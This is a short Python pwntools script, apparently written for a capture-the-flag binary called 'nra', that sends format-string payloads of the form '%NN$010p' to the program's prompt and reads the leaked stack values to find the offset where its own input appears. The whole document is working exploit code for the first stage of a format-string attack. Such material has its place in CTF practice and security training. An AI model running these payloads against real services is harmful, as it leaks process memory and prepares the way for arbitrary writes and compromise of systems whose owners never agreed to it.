#!/usr/bin/python3

from pwn import *

def scanit(t):
	p = process('./nra')
	#p = remote('pwn.hsctf.com', 5004)
	p.recvuntil('How are you finding RACTF?')
	p.sendline(t)
	p.recvuntil('I am glad you\n')
	_ = p.recvline().strip()
	p.close()
	return _
	

for i in range(1,20):
	t = '%' + str(i).rjust(2,'0') + '$010p'
	_ = scanit(t)
	print(i,_)
	if _.find(b'0x') >= 0:
		s = bytes.fromhex(_[2:].decode())[::-1]
		if s == t[:4].encode():
			print('offset:',i)
			break
		
